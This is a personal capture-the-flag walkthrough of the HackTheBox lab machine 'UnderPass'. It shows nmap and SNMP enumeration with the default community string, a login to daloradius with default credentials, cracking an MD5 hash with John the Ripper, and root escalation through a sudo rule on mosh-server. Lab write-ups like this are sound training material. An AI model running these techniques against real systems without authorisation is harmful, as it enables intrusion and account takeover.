# UnderPass
SNMP disclosure, Default authentication vulnerability and Mosh

- `10.10.11.48`
- Linux
- Easy

It's been a minute for me, lets take a crack at it! 

Start with `nmap` of course.

    nmap -sC -sV -vv 10.10.11.48

Looks like we get responses from the `SSH` port `22` and `HTTP` on port `80`.

    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
    |   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91 
    80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
    | http-methods:
    |_  Supported Methods: POST OPTIONS HEAD GET
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Visiting the index page for the web server at `http://10.10.11.48/` yields the default apache page.

We can try to brute force web directories and virtual hosts with `gobuster`.

However, it doesn't seem like there's any common routes on this web server... 

The machine doesn't seem to host any `DNS` server. let's do a full port scan.

    nmap -sS -p- -vv underpass.htb

Same thing.

    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 63
    80/tcp open  http    syn-ack ttl 63


Hmm... what about `UDP`?

    nmap -sU -vv underpass.htb

Oh! looks like we have `SNMP` related things?

    PORT     STATE         SERVICE REASON
    161/udp  open          snmp    udp-response ttl 63
    1812/udp open|filtered radius  no-response
    1813/udp open|filtered radacct no-response

Okay, down the `SNMP` rabbit hole.

found a useful command called `snmpwalk` which dumps public `SNMP` records. 

Apparently version `3` of `SNMP` introduces stronger authentication so its always worthwhile to try the weaker versions of the protocol first.

Just for future reference. `SNMP` version `2c` and below uses something like a password to protect the data called a `community string`.

Don't ask me why `2c` is called `2c` instead of `2`. I didn't look into it.

For publicly available data, usually that password is something like `public`. According to
some older sources, it looks like `private` is also a common default community string. 

Running this command will dump all the public records using the `2c` version of the protocol.

    snmpwalk -v 2c -c public underpass.htb

Looks like we found a username, super useful. This looks like something that could even be found in the wild.

    SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
    SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
    DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (4135752) 11:29:17.52
    SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
    SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
    SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas


We also found what looks like the name of a service. `daloradius`. 

Doing a quick search online, [that's exactly what it is.](https://github.com/lirantal/daloradius.git).  

Found `/daloradius/app/users/login.php` which will allow me to log into the application.  

Maybe from here we can gather the version of the webserver and look for any CVEs. 

Tried all the default credentials in the README but no luck... 

_~about 2 hours pass~_

Okay, so i was messing around some more and this is why it's important to double check things. 

`/daloradius/app/users/login.php` is for regular users.

`/daloradius/app/operators/login.php` is for admins. 

![daloradius-admin](/static/media/ctf/htb-daloradius.png)

Anyway... It's important to reset the default password after installing one of these dashboards. Otherwise _anyone_ could just read the GitHub documentation and log in. 

I found one user named `svcMosh` in the users list. The word `Mosh` leads me to believe that the program `Mosh` is involved somehow, but we'll have to see. 

When we go the users page, an `MD5` hash for our user is seemingly right here in the UI. 

`412DD4...` is the first 6 characters of the hash. You can see for yourself what the rest of the chracters are. We're going to save this into `md5sum.txt`. 

    john --wordlist=./rockyou.txt --format=Raw-MD5 ./md5sum.txt

[John the Ripper](https://www.openwall.com/john/) will make short work of this hash with the `rockyou.txt` wordlist. 

Okay... Using those creds with `SSH` doesnt seem to do anything. not with `steve` or `svcmosh`. 

Maybe this is just something that will come in handy later? 

...`version 2.2 beta / 03 Jul 2024` so maybe no SQLi like we see on `exploitdb`... 

_~about 2 more hours pass~_

I WAS BEING DUMB. CASE MATTERS! 

`ssh svcMosh@underpass.htb` with the cracked hash gives us a user on the box. 

![dalradius-user-shell](/static/media/ctf/htb-daloradius-user.png)

Yay!

The first thing to do is check if we straight up have root privs for anything, so `sudo -l` which gives us the interesting path of `/usr/bin/mosh-server`. 

    Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

    User svcMosh may run the following commands on localhost:
        (ALL) NOPASSWD: /usr/bin/mosh-server

I will save you the wasted time and effort I made while trying to crack this, but this is kinda sneaky. 

The program `mosh` works by running `mosh-client` to interact with `SSH`, and then running a command through `SSH` to start `mosh-server` on the remote machine. 

The `mosh` command has an argument called `--server` which is _what I thought was_ a strict path, however it's perfectly valid to supply arguments as well. 

Seeing this, there's nothing stopping us from supplying `sudo /usr/bin/mosh-server` for the path. 

    mosh --server="sudo /usr/bin/mosh-server" localhost
    
Drops us into a root shell. 

![dalradius-root-shell](/static/media/ctf/htb-daloradius-root.png)

Nice! 

I would say this machine is very easy. I was able to figure it out without any help except for the `SNMP` foothold, but that was minimal. 

_~ Happy Hacking_
